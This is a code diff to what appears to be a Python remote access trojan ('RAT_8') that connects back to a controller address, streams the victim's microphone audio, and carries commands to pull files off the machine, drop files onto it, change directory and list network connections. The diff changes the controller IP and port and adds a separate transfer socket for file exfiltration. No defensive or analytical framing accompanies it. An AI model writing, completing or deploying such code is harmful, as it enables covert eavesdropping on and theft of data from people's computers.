@@ -14,9 +14,9 @@ import numpy , winreg
 import pyaudio
 import time , sys , os , subprocess , playsound
 
-ip = "192.168.1.5"
+ip = "192.168.1.16"
 
-port = int("4785")
+port = int("8080")
 
 mutex = "RAT_8"
 
@@ -189,7 +189,7 @@ def getdata(file):
     data = f.read()
     return data
 
-def sendfile(host , datafile):
+def sendfile(host , datafile , connection):
     chunks = []
     chunksize = 1000000
     try:
@@ -200,7 +200,7 @@ def sendfile(host , datafile):
         chunknumber = 0
         for n in range(iters):
             host.recv(1024)
-            host.sendall(chunks[chunknumber])
+            connection.sendall(chunks[chunknumber])
             chunknumber += 1
     except PermissionError:
         host.send(pickle.dumps(create_response_header("Error 2" , None)))
@@ -216,13 +216,13 @@ def suono(percorso):
     except:
         pass
 
-def recieve_file(host , header):
+def recieve_file(host , header , connection):
     file_data = b""
     print(header)
     iters = header["flag"]
     for n in range(iters):
         server.sendall(b"done")
-        pezzo = host.recv(1000000)
+        pezzo = connection.recv(1000000)
         file_data = file_data + pezzo
     os.chdir(target)
     with open(header["object"] , "wb") as file:
@@ -310,6 +310,11 @@ while True:
                 mic_audio.connect((ip , port))
                 mic_audio.sendall(pickle.dumps("$mic_audio"))
                 print(mic_audio)
+                transfer = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+                transfer.connect((ip , port))
+                transfer.sendall(pickle.dumps("$transfer"))
+                print(transfer)
+
             except:
                 pass
             while True:
@@ -364,7 +369,8 @@ while True:
                         
                 if header["prefix"] == "$get":
                     data_file = getdata(header["object"])
-                    sendfile(server , data_file)
+                    print(len(data_file))
+                    sendfile(server , data_file , transfer)
 
                 if header["prefix"] == "$change_directory":
                     if os.path.exists(header["object"]):
@@ -390,7 +396,7 @@ while True:
 
                 
                 if header["prefix"] == "$send":
-                    recieve_file(server , header)
+                    recieve_file(server , header , transfer)
 
 
                 if header["prefix"] == "$netstat":
